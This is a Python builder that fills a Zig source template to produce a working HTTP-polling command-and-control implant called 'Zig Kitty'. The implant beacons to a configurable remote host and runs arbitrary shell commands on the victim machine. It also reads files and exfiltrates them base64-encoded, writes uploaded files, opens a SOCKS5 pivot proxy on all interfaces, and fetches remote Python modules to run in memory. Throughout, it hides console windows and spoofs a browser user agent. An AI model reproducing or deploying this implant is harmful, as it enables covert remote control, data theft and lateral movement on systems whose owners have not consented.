#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zig Kitty HTTP polling implant source builder (Zig 0.15)."""

from __future__ import annotations

from lib.c2.zig_memimporter import build_zig_memimporter_block

# Zig source uses __TOKEN__ placeholders so Python f-strings never collide with Zig {s}.
_ZIG_KITTY_TEMPLATE = r'''const std = @import("std");
const builtin = @import("builtin");
const process = std.process;
const mem = std.mem;
const json = std.json;
const base64 = std.base64;

const HOST = "__HOST__";
const PORT: u16 = __PORT__;
const PREFIX = "__PREFIX__";
const CID = "__CID__";
const POLL_BASE: u64 = __POLL__;
const UA = "__UA__";
const USE_SSL = __USE_SSL__;
// 64 hex chars = 32-byte Ed25519 seed; empty = no signature
const ED25519_SEED_HEX = "__ED25519_SEED_HEX__";

var g_socks_running: std.atomic.Value(bool) = .init(false);
var g_socks_port: std.atomic.Value(u16) = .init(1080);

fn sleepSecs(secs: u64) void {
    std.Thread.sleep(secs * std.time.ns_per_s);
}

fn hexNibble(c: u8) ?u8 {
    return switch (c) {
        '0'...'9' => c - '0',
        'a'...'f' => c - 'a' + 10,
        'A'...'F' => c - 'A' + 10,
        else => null,
    };
}

fn parseSeedHex(hex: []const u8) ?[32]u8 {
    if (hex.len != 64) return null;
    var out: [32]u8 = undefined;
    var i: usize = 0;
    while (i < 32) : (i += 1) {
        const hi = hexNibble(hex[i * 2]) orelse return null;
        const lo = hexNibble(hex[i * 2 + 1]) orelse return null;
        out[i] = (hi << 4) | lo;
    }
    return out;
}

fn signCid(allocator: mem.Allocator) ?[]u8 {
    const seed = parseSeedHex(ED25519_SEED_HEX) orelse return null;
    const Ed25519 = std.crypto.sign.Ed25519;
    const kp = Ed25519.KeyPair.generateDeterministic(seed) catch return null;
    const sig = kp.sign(CID, null) catch return null;
    const bytes = sig.toBytes();
    const enc = base64.url_safe_no_pad.Encoder;
    const out = allocator.alloc(u8, enc.calcSize(bytes.len)) catch return null;
    _ = enc.encode(out, &bytes);
    return out;
}

fn buildPollPath(allocator: mem.Allocator, which: []const u8) ![]u8 {
    if (signCid(allocator)) |sig| {
        defer allocator.free(sig);
        return try std.fmt.allocPrint(allocator, "{s}/{s}?id={s}&sig={s}", .{ PREFIX, which, CID, sig });
    }
    return try std.fmt.allocPrint(allocator, "{s}/{s}?id={s}", .{ PREFIX, which, CID });
}

fn b64Encode(allocator: mem.Allocator, data: []const u8) ![]u8 {
    const enc = base64.standard.Encoder;
    const out = try allocator.alloc(u8, enc.calcSize(data.len));
    _ = enc.encode(out, data);
    return out;
}

fn b64Decode(allocator: mem.Allocator, data: []const u8) ![]u8 {
    const dec = base64.standard.Decoder;
    const out = try allocator.alloc(u8, try dec.calcSizeForSlice(data));
    try dec.decode(out, data);
    return out;
}

fn httpExchangePlain(allocator: mem.Allocator, method: []const u8, path_q: []const u8, body: ?[]const u8) ![]u8 {
    // Prefer std.http.Client over raw sockets — Windows raw TCP + ThreadingHTTPServer
    // often aborts the response write (WinError 10053) before the implant reads it.
    var client = std.http.Client{ .allocator = allocator };
    defer client.deinit();
    const url = try std.fmt.allocPrint(allocator, "http://{s}:{d}{s}", .{ HOST, PORT, path_q });
    defer allocator.free(url);

    var aw: std.Io.Writer.Allocating = .init(allocator);
    defer aw.deinit();

    const method_e: std.http.Method = if (mem.eql(u8, method, "POST")) .POST else .GET;
    _ = try client.fetch(.{
        .location = .{ .url = url },
        .method = method_e,
        .payload = body,
        .response_writer = &aw.writer,
        .keep_alive = false,
        .headers = .{
            .user_agent = .{ .override = UA },
            .content_type = if (body != null) .{ .override = "application/json" } else .default,
        },
    });
    return try allocator.dupe(u8, aw.written());
}

fn httpExchangeTls(allocator: mem.Allocator, method: []const u8, path_q: []const u8, body: ?[]const u8) ![]u8 {
    var client = std.http.Client{ .allocator = allocator };
    defer client.deinit();
    const url = try std.fmt.allocPrint(allocator, "https://{s}:{d}{s}", .{ HOST, PORT, path_q });
    defer allocator.free(url);

    var aw: std.Io.Writer.Allocating = .init(allocator);
    defer aw.deinit();

    const method_e: std.http.Method = if (mem.eql(u8, method, "POST")) .POST else .GET;
    _ = try client.fetch(.{
        .location = .{ .url = url },
        .method = method_e,
        .payload = body,
        .response_writer = &aw.writer,
        .keep_alive = false,
        .headers = .{
            .user_agent = .{ .override = UA },
            .content_type = if (body != null) .{ .override = "application/json" } else .default,
        },
    });
    return try allocator.dupe(u8, aw.written());
}

fn httpExchange(allocator: mem.Allocator, method: []const u8, path_q: []const u8, body: ?[]const u8) ![]u8 {
    if (USE_SSL) return httpExchangeTls(allocator, method, path_q, body);
    return httpExchangePlain(allocator, method, path_q, body);
}

fn jStr(obj: json.Value, key: []const u8) ?[]const u8 {
    if (obj != .object) return null;
    const v = obj.object.get(key) orelse return null;
    return if (v == .string) v.string else null;
}

fn jBool(obj: json.Value, key: []const u8) bool {
    if (obj != .object) return false;
    const v = obj.object.get(key) orelse return false;
    return if (v == .bool) v.bool else false;
}

fn jFloat(obj: json.Value, key: []const u8, default_v: f64) f64 {
    if (obj != .object) return default_v;
    const v = obj.object.get(key) orelse return default_v;
    return switch (v) {
        .float => |f| f,
        .integer => |i| @floatFromInt(i),
        else => default_v,
    };
}

fn windowsWhoami(allocator: mem.Allocator) ![]u8 {
    const user = std.process.getEnvVarOwned(allocator, "USERNAME") catch
        return try allocator.dupe(u8, "unknown");
    const domain = std.process.getEnvVarOwned(allocator, "USERDOMAIN") catch {
        return user;
    };
    defer allocator.free(domain);
    if (domain.len == 0 or mem.eql(u8, domain, user)) return user;
    const joined = try std.fmt.allocPrint(allocator, "{s}\\{s}", .{ domain, user });
    allocator.free(user);
    return joined;
}

/// Convert Windows OEM/ANSI console bytes to UTF-8 when the slice is not valid UTF-8.
fn windowsOemToUtf8(allocator: mem.Allocator, input: []const u8) ![]u8 {
    if (input.len == 0) return try allocator.dupe(u8, "");
    if (std.unicode.utf8ValidateSlice(input)) return try allocator.dupe(u8, input);

    const MultiByteToWideChar = struct {
        extern "kernel32" fn MultiByteToWideChar(
            CodePage: u32,
            dwFlags: u32,
            lpMultiByteStr: [*]const u8,
            cbMultiByte: i32,
            lpWideCharStr: ?[*]u16,
            cchWideChar: i32,
        ) callconv(.winapi) i32;
    }.MultiByteToWideChar;
    const WideCharToMultiByte = struct {
        extern "kernel32" fn WideCharToMultiByte(
            CodePage: u32,
            dwFlags: u32,
            lpWideCharStr: [*]const u16,
            cchWideChar: i32,
            lpMultiByteStr: ?[*]u8,
            cbMultiByte: i32,
            lpDefaultChar: ?[*]const u8,
            lpUsedDefaultChar: ?*i32,
        ) callconv(.winapi) i32;
    }.WideCharToMultiByte;

    const CP_OEMCP: u32 = 1;
    const CP_UTF8: u32 = 65001;

    var codepage: u32 = CP_OEMCP;
    var wide_len = MultiByteToWideChar(codepage, 0, input.ptr, @intCast(input.len), null, 0);
    if (wide_len <= 0) {
        codepage = 850;
        wide_len = MultiByteToWideChar(codepage, 0, input.ptr, @intCast(input.len), null, 0);
    }
    if (wide_len <= 0) {
        codepage = 1252;
        wide_len = MultiByteToWideChar(codepage, 0, input.ptr, @intCast(input.len), null, 0);
    }
    if (wide_len <= 0) return try allocator.dupe(u8, input);

    const wide = try allocator.alloc(u16, @intCast(wide_len));
    defer allocator.free(wide);
    _ = MultiByteToWideChar(codepage, 0, input.ptr, @intCast(input.len), wide.ptr, wide_len);

    const utf8_len = WideCharToMultiByte(CP_UTF8, 0, wide.ptr, wide_len, null, 0, null, null);
    if (utf8_len <= 0) return try allocator.dupe(u8, input);
    const out = try allocator.alloc(u8, @intCast(utf8_len));
    _ = WideCharToMultiByte(CP_UTF8, 0, wide.ptr, wide_len, out.ptr, utf8_len, null, null);
    return out;
}

fn normalizeShellOutput(allocator: mem.Allocator, raw: []u8) ![]u8 {
    if (builtin.os.tag != .windows) return raw;
    if (std.unicode.utf8ValidateSlice(raw)) return raw;
    const converted = windowsOemToUtf8(allocator, raw) catch return raw;
    allocator.free(raw);
    return converted;
}

fn execShell(allocator: mem.Allocator, cmd: []const u8) ![]u8 {
    const trimmed = mem.trim(u8, cmd, " \t\r\n");
    if (trimmed.len == 0) return try allocator.dupe(u8, "");

    // Prefer env-based builtins (no child process) — avoids Windows pipe/hang races
    if (mem.eql(u8, trimmed, "whoami")) {
        if (builtin.os.tag == .windows) {
            return try windowsWhoami(allocator);
        }
        if (std.process.getEnvVarOwned(allocator, "USER")) |u| return u else |_| {}
    }
    if (mem.eql(u8, trimmed, "pwd") or mem.eql(u8, trimmed, "cd")) {
        return process.getCwdAlloc(allocator) catch try allocator.dupe(u8, ".");
    }

    var argv_buf: [4][]const u8 = undefined;
    const argv: []const []const u8 = blk: {
        if (builtin.os.tag == .windows) {
            // Do NOT prefix with `chcp … &` — CreateProcess re-quotes the /c argument, and
            // nested quotes + `&` break type/del/if (ERROR_INVALID_NAME). OEM→UTF-8 is
            // handled in normalizeShellOutput instead.
            argv_buf = .{ "cmd.exe", "/d", "/c", trimmed };
            break :blk argv_buf[0..];
        } else {
            argv_buf = .{ "/bin/sh", "-c", trimmed, "" };
            break :blk argv_buf[0..3];
        }
    };

    var child = process.Child.init(argv, allocator);
    child.stdin_behavior = .Ignore;
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    if (builtin.os.tag == .windows) child.create_no_window = true;
    child.spawn() catch |e| return try std.fmt.allocPrint(allocator, "ERROR:{s}\n", .{@errorName(e)});

    // Watchdog: kill hung children so the implant keeps polling / posting results
    var done = std.atomic.Value(bool).init(false);
    const Watch = struct {
        fn run(c: *process.Child, flag: *std.atomic.Value(bool)) void {
            var i: u64 = 0;
            while (i < 45) : (i += 1) {
                if (flag.load(.seq_cst)) return;
                sleepSecs(1);
            }
            if (!flag.load(.seq_cst)) _ = c.kill() catch {};
        }
    };
    const watcher = std.Thread.spawn(.{}, Watch.run, .{ &child, &done }) catch null;

    var out: std.ArrayList(u8) = .empty;
    errdefer out.deinit(allocator);
    var errb: std.ArrayList(u8) = .empty;
    defer errb.deinit(allocator);
    child.collectOutput(allocator, &out, &errb, 1024 * 1024) catch |e| {
        done.store(true, .seq_cst);
        if (watcher) |t| t.join();
        _ = child.kill() catch {};
        _ = child.wait() catch {};
        return try std.fmt.allocPrint(allocator, "ERROR:{s}\n", .{@errorName(e)});
    };
    done.store(true, .seq_cst);
    if (watcher) |t| t.join();
    if (errb.items.len != 0) {
        try out.appendSlice(allocator, errb.items);
    }
    const raw = try out.toOwnedSlice(allocator);
    return try normalizeShellOutput(allocator, raw);
}

const TaskResult = struct {
    out: []u8,
    status: []const u8,
    files_json: []u8,
    die: bool,
};

fn emptyFiles(allocator: mem.Allocator) ![]u8 {
    return try allocator.dupe(u8, "[]");
}

fn socksRelay(a: std.net.Stream, b: std.net.Stream) void {
    var buf: [8192]u8 = undefined;
    while (true) {
        const n = a.read(buf[0..]) catch break;
        if (n == 0) break;
        b.writeAll(buf[0..n]) catch break;
    }
}

fn handleSocksClient(client: std.net.Stream) void {
    defer client.close();
    var buf: [512]u8 = undefined;

    // greeting
    const n0 = client.read(buf[0..2]) catch return;
    if (n0 < 2 or buf[0] != 0x05) return;
    const nmethods = buf[1];
    if (nmethods > 0) _ = client.read(buf[0..nmethods]) catch return;
    // no auth
    client.writeAll(&[_]u8{ 0x05, 0x00 }) catch return;

    // request header
    const n1 = client.read(buf[0..4]) catch return;
    if (n1 < 4 or buf[0] != 0x05 or buf[1] != 0x01) return; // CONNECT only
    const atyp = buf[3];

    var host_storage: [256]u8 = undefined;
    var host: []const u8 = undefined;
    if (atyp == 0x01) { // IPv4
        _ = client.read(buf[0..4]) catch return;
        host = std.fmt.bufPrint(&host_storage, "{d}.{d}.{d}.{d}", .{ buf[0], buf[1], buf[2], buf[3] }) catch return;
    } else if (atyp == 0x03) { // domain
        _ = client.read(buf[0..1]) catch return;
        const dlen = buf[0];
        if (dlen == 0 or dlen > host_storage.len) return;
        _ = client.read(host_storage[0..dlen]) catch return;
        host = host_storage[0..dlen];
    } else {
        return;
    }
    _ = client.read(buf[0..2]) catch return;
    const port: u16 = (@as(u16, buf[0]) << 8) | buf[1];

    const alloc = std.heap.page_allocator;
    var remote = std.net.tcpConnectToHost(alloc, host, port) catch {
        client.writeAll(&[_]u8{ 0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0 }) catch {};
        return;
    };
    defer remote.close();
    client.writeAll(&[_]u8{ 0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0 }) catch return;

    const t = std.Thread.spawn(.{}, socksRelay, .{ remote, client }) catch {
        socksRelay(client, remote);
        return;
    };
    defer t.join();
    socksRelay(client, remote);
}

fn socksServerMain() void {
    const port = g_socks_port.load(.seq_cst);
    const addr = std.net.Address.parseIp4("0.0.0.0", port) catch return;
    var server = addr.listen(.{ .reuse_address = true }) catch return;
    defer server.deinit();
    while (g_socks_running.load(.seq_cst)) {
        const conn = server.accept() catch {
            std.Thread.sleep(100 * std.time.ns_per_ms);
            continue;
        };
        const thr = std.Thread.spawn(.{}, handleSocksClient, .{conn.stream}) catch {
            conn.stream.close();
            continue;
        };
        thr.detach();
    }
}

fn startSocks(port: u16) bool {
    if (g_socks_running.load(.seq_cst)) return true;
    g_socks_port.store(if (port == 0) 1080 else port, .seq_cst);
    g_socks_running.store(true, .seq_cst);
    const thr = std.Thread.spawn(.{}, socksServerMain, .{}) catch {
        g_socks_running.store(false, .seq_cst);
        return false;
    };
    thr.detach();
    return true;
}

fn stopSocks() void {
    g_socks_running.store(false, .seq_cst);
}

fn jsonEscapeAppend(list: *std.ArrayList(u8), allocator: mem.Allocator, s: []const u8) !void {
    for (s) |c| {
        switch (c) {
            '"' => try list.appendSlice(allocator, "\\\""),
            '\\' => try list.appendSlice(allocator, "\\\\"),
            '\n' => try list.appendSlice(allocator, "\\n"),
            '\r' => try list.appendSlice(allocator, "\\r"),
            '\t' => try list.appendSlice(allocator, "\\t"),
            else => try list.append(allocator, c),
        }
    }
}

fn buildFilesJson(allocator: mem.Allocator, path: []const u8, enc: []const u8) ![]u8 {
    var list: std.ArrayList(u8) = .empty;
    errdefer list.deinit(allocator);
    try list.appendSlice(allocator, "[{\"path\":\"");
    try jsonEscapeAppend(&list, allocator, path);
    try list.appendSlice(allocator, "\",\"encoding\":\"base64\",\"data\":\"");
    try list.appendSlice(allocator, enc);
    try list.appendSlice(allocator, "\"}]");
    return try list.toOwnedSlice(allocator);
}

fn buildResultBody(allocator: mem.Allocator, task_id: []const u8, enc_out: []const u8, status: []const u8, files_json: []const u8) ![]u8 {
    var list: std.ArrayList(u8) = .empty;
    errdefer list.deinit(allocator);
    try list.appendSlice(allocator, "{\"output\":\"");
    try list.appendSlice(allocator, enc_out);
    try list.appendSlice(allocator, "\",\"encoding\":\"base64\",\"id\":\"");
    try jsonEscapeAppend(&list, allocator, CID);
    try list.appendSlice(allocator, "\",\"task_id\":\"");
    try jsonEscapeAppend(&list, allocator, task_id);
    try list.appendSlice(allocator, "\",\"status\":\"");
    try jsonEscapeAppend(&list, allocator, status);
    try list.appendSlice(allocator, "\",\"files\":");
    try list.appendSlice(allocator, files_json);
    try list.append(allocator, '}');
    return try list.toOwnedSlice(allocator);
}

fn urlEncodeQuery(allocator: mem.Allocator, input: []const u8) ![]u8 {
    var list: std.ArrayList(u8) = .empty;
    errdefer list.deinit(allocator);
    for (input) |c| {
        const safe = (c >= 'A' and c <= 'Z') or (c >= 'a' and c <= 'z') or
            (c >= '0' and c <= '9') or c == '-' or c == '_' or c == '.';
        if (safe) {
            try list.append(allocator, c);
        } else {
            try std.fmt.format(list.writer(allocator), "%{X:0>2}", .{c});
        }
    }
    return try list.toOwnedSlice(allocator);
}

__ZIG_MEMIMPORTER__

fn fetchRemoteModuleContent(allocator: mem.Allocator, module_path: []const u8, language: []const u8) ![]u8 {
    if (module_path.len == 0) return error.EmptyModulePath;
    if (modCacheGet(allocator, module_path)) |cached| {
        return try allocator.dupe(u8, cached);
    }
    const enc_path = try urlEncodeQuery(allocator, module_path);
    defer allocator.free(enc_path);
    const lang = if (language.len > 0) language else "python";
    const path = try std.fmt.allocPrint(allocator, "{s}/module?id={s}&path={s}&language={s}", .{ PREFIX, CID, enc_path, lang });
    defer allocator.free(path);
    const raw = try httpExchange(allocator, "GET", path, null);
    defer allocator.free(raw);
    var parsed = json.parseFromSlice(json.Value, allocator, raw, .{}) catch return error.InvalidModuleResponse;
    defer parsed.deinit();
    const content = jStr(parsed.value, "content") orelse return error.EmptyModuleContent;
    const digest = jStr(parsed.value, "sha256") orelse "";
    if (digest.len > 0) {
        var hasher = std.crypto.hash.sha2.Sha256.init(.{});
        hasher.update(content);
        var out_hash: [32]u8 = undefined;
        hasher.final(&out_hash);
        var hex_buf: [64]u8 = undefined;
        _ = std.fmt.bufPrint(&hex_buf, "{s}", .{std.fmt.fmtSliceHexLower(&out_hash)}) catch {};
        if (!mem.eql(u8, digest, hex_buf[0..64])) {
            return error.ModuleDigestMismatch;
        }
    }
    try modCachePut(allocator, module_path, content);
    return try allocator.dupe(u8, content);
}

fn fetchRemoteModule(allocator: mem.Allocator, module_path: []const u8, dest_path: []const u8, language: []const u8) ![]u8 {
    const content = fetchRemoteModuleContent(allocator, module_path, language) catch |e| {
        return try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
    };
    defer allocator.free(content);
    if (dest_path.len > 0) {
        try std.fs.cwd().writeFile(.{ .sub_path = dest_path, .data = content });
        return try std.fmt.allocPrint(allocator, "OK cached {s} -> {s} ({d} bytes)", .{ module_path, dest_path, content.len });
    }
    return try std.fmt.allocPrint(allocator, "OK cached {s} in memory ({d} bytes)", .{ module_path, content.len });
}

fn runRemoteModule(allocator: mem.Allocator, module_path: []const u8, language: []const u8) ![]u8 {
    const lang = if (language.len > 0) language else "python";
    const content = fetchRemoteModuleContent(allocator, module_path, lang) catch |e| {
        return try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
    };
    defer allocator.free(content);
    if (mem.eql(u8, lang, "python") or mem.eql(u8, lang, "py")) {
        return execPythonModuleInMemory(allocator, content);
    }
    return try std.fmt.allocPrint(allocator, "ERROR:unsupported language {s}", .{lang});
}

fn runTask(allocator: mem.Allocator, task: json.Value) !TaskResult {
    var die = false;
    var status: []const u8 = "completed";
    var files = try emptyFiles(allocator);
    var out = try allocator.dupe(u8, "");

    const cmd_raw = jStr(task, "command") orelse "";
    var lower_buf: [64]u8 = undefined;
    const n = @min(cmd_raw.len, lower_buf.len);
    for (cmd_raw[0..n], 0..) |c, i| {
        lower_buf[i] = if (c >= 'A' and c <= 'Z') c + 32 else c;
    }
    const cmd = lower_buf[0..n];
    const args: json.Value = if (task == .object) (task.object.get("args") orelse .null) else .null;

    if (mem.eql(u8, cmd, "shell") or mem.eql(u8, cmd, "cmd")) {
        allocator.free(out);
        out = try execShell(allocator, jStr(args, "cmd") orelse jStr(args, "command") orelse "");
    } else if (mem.eql(u8, cmd, "pwd")) {
        allocator.free(out);
        out = process.getCwdAlloc(allocator) catch try allocator.dupe(u8, ".");
    } else if (mem.eql(u8, cmd, "whoami")) {
        allocator.free(out);
        if (builtin.os.tag == .windows) {
            out = try windowsWhoami(allocator);
        } else {
            out = std.process.getEnvVarOwned(allocator, "USER") catch
                (try execShell(allocator, "id -un"));
        }
    } else if (mem.eql(u8, cmd, "ls")) {
        const path = jStr(args, "path") orelse ".";
        var dir = std.fs.cwd().openDir(path, .{ .iterate = true }) catch |e| {
            allocator.free(out);
            out = try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
            status = "failed";
            return .{ .out = out, .status = status, .files_json = files, .die = die };
        };
        defer dir.close();
        var list: std.ArrayList(u8) = .empty;
        defer list.deinit(allocator);
        var it = dir.iterate();
        while (try it.next()) |entry| {
            try list.appendSlice(allocator, entry.name);
            try list.append(allocator, '\n');
        }
        allocator.free(out);
        out = try list.toOwnedSlice(allocator);
    } else if (mem.eql(u8, cmd, "cat")) {
        const path = jStr(args, "path") orelse "";
        const data = std.fs.cwd().readFileAlloc(allocator, path, 200_000) catch |e| {
            allocator.free(out);
            out = try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
            status = "failed";
            return .{ .out = out, .status = status, .files_json = files, .die = die };
        };
        allocator.free(out);
        out = data;
    } else if (mem.eql(u8, cmd, "download")) {
        const path = jStr(args, "path") orelse "";
        const data = std.fs.cwd().readFileAlloc(allocator, path, 8 * 1024 * 1024) catch |e| {
            allocator.free(out);
            out = try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
            status = "failed";
            return .{ .out = out, .status = status, .files_json = files, .die = die };
        };
        defer allocator.free(data);
        const enc = try b64Encode(allocator, data);
        defer allocator.free(enc);
        allocator.free(files);
        files = try buildFilesJson(allocator, path, enc);
        allocator.free(out);
        out = try std.fmt.allocPrint(allocator, "OK {d} bytes", .{data.len});
    } else if (mem.eql(u8, cmd, "upload")) {
        const path = jStr(args, "path") orelse "";
        const blob = jStr(args, "data") orelse "";
        const raw = b64Decode(allocator, blob) catch |e| {
            allocator.free(out);
            out = try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
            status = "failed";
            return .{ .out = out, .status = status, .files_json = files, .die = die };
        };
        defer allocator.free(raw);
        std.fs.cwd().writeFile(.{ .sub_path = path, .data = raw }) catch |e| {
            allocator.free(out);
            out = try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
            status = "failed";
            return .{ .out = out, .status = status, .files_json = files, .die = die };
        };
        allocator.free(out);
        out = try std.fmt.allocPrint(allocator, "OK wrote {s}", .{path});
    } else if (mem.eql(u8, cmd, "socks_start") or mem.eql(u8, cmd, "socks")) {
        var port: u16 = 1080;
        if (jStr(args, "port")) |ps| {
            port = std.fmt.parseInt(u16, ps, 10) catch 1080;
        } else if (args == .object) {
            if (args.object.get("port")) |pv| {
                port = switch (pv) {
                    .integer => |i| @intCast(@max(0, i)),
                    else => 1080,
                };
            }
        }
        allocator.free(out);
        if (startSocks(port)) {
            out = try std.fmt.allocPrint(allocator, "SOCKS5 listening on 0.0.0.0:{d}", .{g_socks_port.load(.seq_cst)});
        } else {
            out = try allocator.dupe(u8, "ERROR: failed to start SOCKS5");
            status = "failed";
        }
    } else if (mem.eql(u8, cmd, "socks_stop")) {
        stopSocks();
        allocator.free(out);
        out = try allocator.dupe(u8, "SOCKS5 stop requested");
    } else if (mem.eql(u8, cmd, "fetch_module")) {
        const mod_path = jStr(args, "path") orelse jStr(args, "module_path") orelse "";
        const dest = jStr(args, "dest") orelse jStr(args, "save_as") orelse "";
        const lang = jStr(args, "language") orelse "python";
        allocator.free(out);
        out = fetchRemoteModule(allocator, mod_path, dest, lang) catch |e| try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
    } else if (mem.eql(u8, cmd, "run_module")) {
        const mod_path = jStr(args, "path") orelse jStr(args, "module_path") orelse "";
        const lang = jStr(args, "language") orelse "python";
        allocator.free(out);
        out = runRemoteModule(allocator, mod_path, lang) catch |e| try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
    } else if (mem.eql(u8, cmd, "exit")) {
        allocator.free(out);
        out = try allocator.dupe(u8, "bye");
        die = true;
    } else {
        allocator.free(out);
        out = try execShell(allocator, cmd_raw);
    }

    return .{ .out = out, .status = status, .files_json = files, .die = die };
}

fn postResult(allocator: mem.Allocator, task_id: []const u8, out: []const u8, status: []const u8, files_json: []const u8) void {
    const enc = b64Encode(allocator, out) catch return;
    defer allocator.free(enc);
    const body = buildResultBody(allocator, task_id, enc, status, files_json) catch return;
    defer allocator.free(body);
    const path = buildPollPath(allocator, "result") catch return;
    defer allocator.free(path);
    // Retry: Windows POST /result is the fragile hop (poll GET usually works)
    var attempt: u8 = 0;
    while (attempt < 3) : (attempt += 1) {
        if (httpExchange(allocator, "POST", path, body)) |resp| {
            allocator.free(resp);
            return;
        } else |_| {
            sleepSecs(1);
        }
    }
}

fn handleTaskValue(allocator: mem.Allocator, task: json.Value, next_sleep: u64) !bool {
    const tid = jStr(task, "task_id") orelse "";
    // Never let a task error kill the implant loop — always try to POST something
    const result = runTask(allocator, task) catch |e| blk: {
        const msg = try std.fmt.allocPrint(allocator, "ERROR:runTask:{s}\n", .{@errorName(e)});
        const files = try emptyFiles(allocator);
        break :blk TaskResult{ .out = msg, .status = "failed", .files_json = files, .die = false };
    };
    defer allocator.free(result.out);
    defer allocator.free(result.files_json);
    postResult(allocator, tid, result.out, result.status, result.files_json);
    if (result.die) return true;
    sleepSecs(next_sleep);
    return false;
}

__PRESTAGE_HELPERS__

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{ .safety = false }){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

__PRESTAGE__

    while (true) {
        const path = buildPollPath(allocator, "poll") catch {
            sleepSecs(POLL_BASE);
            continue;
        };
        defer allocator.free(path);

        const body = httpExchange(allocator, "GET", path, null) catch {
            sleepSecs(POLL_BASE);
            continue;
        };
        defer allocator.free(body);

        const parsed = json.parseFromSlice(json.Value, allocator, body, .{}) catch {
            sleepSecs(POLL_BASE);
            continue;
        };
        defer parsed.deinit();
        const root = parsed.value;
        if (jBool(root, "die")) break;

        var next_sleep: u64 = POLL_BASE;
        const ns = jFloat(root, "next_sleep", @floatFromInt(POLL_BASE));
        if (ns > 0) next_sleep = @as(u64, @intFromFloat(ns));

        var handled = false;
        if (root == .object) {
            if (root.object.get("task")) |t| {
                if (t == .object) {
                    handled = true;
                    // catch so a single bad task cannot exit main
                    const should_die = handleTaskValue(allocator, t, next_sleep) catch false;
                    if (should_die) break;
                }
            }
        }

        if (!handled) {
            const enc = jStr(root, "encoding") orelse "";
            const cmd_field = jStr(root, "command") orelse "";
            if (cmd_field.len > 0) {
                if (mem.eql(u8, enc, "task")) {
                    const tp = json.parseFromSlice(json.Value, allocator, cmd_field, .{}) catch null;
                    if (tp) |p2| {
                        defer p2.deinit();
                        const should_die = handleTaskValue(allocator, p2.value, next_sleep) catch false;
                        if (should_die) break;
                        handled = true;
                    }
                }
                if (!handled) {
                    var shell_cmd: []const u8 = cmd_field;
                    var decoded: ?[]u8 = null;
                    if (mem.eql(u8, enc, "base64")) {
                        decoded = b64Decode(allocator, cmd_field) catch null;
                        if (decoded) |d| shell_cmd = d;
                    }
                    defer if (decoded) |d| allocator.free(d);
                    const out = execShell(allocator, shell_cmd) catch try allocator.dupe(u8, "ERROR");
                    defer allocator.free(out);
                    postResult(allocator, "", out, "completed", "[]");
                    sleepSecs(next_sleep);
                    handled = true;
                }
            }
            if (!handled) sleepSecs(next_sleep);
        }
    }
}
'''


def build_zig_kitty_http_source(
    host: str,
    port: int,
    client_id: str,
    *,
    url_prefix: str = "/c2",
    poll_interval: int = 10,
    user_agent: str = "Mozilla/5.0",
    ed25519_seed_hex: str = "",
    use_ssl: bool = False,
    prestage_code: str = "",
) -> str:
    """Return Zig source for a typed Kitty agent against reverse_http_polling."""
    prefix = "/" + str(url_prefix or "/c2").strip("/")
    cid = str(client_id or "zigkitty1").replace("\\", "\\\\").replace('"', '\\"')
    h = str(host or "127.0.0.1").replace("\\", "\\\\").replace('"', '\\"')
    ua = str(user_agent or "Mozilla/5.0").replace("\\", "\\\\").replace('"', '\\"')
    seed = "".join(c for c in str(ed25519_seed_hex or "") if c in "0123456789abcdefABCDEF")
    if len(seed) not in (0, 64):
        seed = ""
    prestage = str(prestage_code or "").strip()
    if prestage and not prestage.endswith("\n"):
        prestage += "\n"
    return (
        _ZIG_KITTY_TEMPLATE.replace("__HOST__", h)
        .replace("__PORT__", str(int(port or 8088)))
        .replace("__PREFIX__", prefix)
        .replace("__CID__", cid)
        .replace("__POLL__", str(max(1, int(poll_interval or 10))))
        .replace("__UA__", ua)
        .replace("__ED25519_SEED_HEX__", seed)
        .replace("__USE_SSL__", "true" if use_ssl else "false")
        .replace("__PRESTAGE_HELPERS__", "")
        .replace("__PRESTAGE__", prestage)
        .replace("__ZIG_MEMIMPORTER__", build_zig_memimporter_block())
    )
